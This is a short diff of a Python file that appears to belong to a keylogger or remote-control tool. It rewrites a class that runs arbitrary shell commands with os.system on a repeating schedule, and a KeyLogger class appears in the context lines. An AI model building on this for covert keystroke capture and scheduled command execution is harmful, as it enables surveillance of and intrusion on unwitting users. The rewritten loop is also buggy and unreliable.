@@ -45,16 +45,26 @@ class KeyLogger:
         listener.stop()
 
 class ScheduleManagement:
-    listOfSchedules = []
-    def __init__(self,second,scheduleName,command):
-        self.second = second
-        self.scheduleName = scheduleName
-        self.command = command
-        self.listOfSchedules.append(self.scheduleName)
+    listOfSchedules = {}
     
-    def startSchedule(self):
-        schedule.every(self.second).do(os.system(self.command))
+    def __init__(self,second,command):
+        self.second = second
+        self.command = command
 
+    def ossystem(self,command):
+        os.system(command)
+    def startSchedule(self):
+        try:
+            schedule.every(self.second).seconds.do(self.ossystem,self.command)
+            while True:
+                if self.command in self.listOfSchedules.keys():
+
+                    schedule.run_pending()
+                else:
+                    SystemExit
+        except:
+            self.listOfSchedules.pop(self.command)
+            
 
 
 def get_current_epoc_time() -> float:
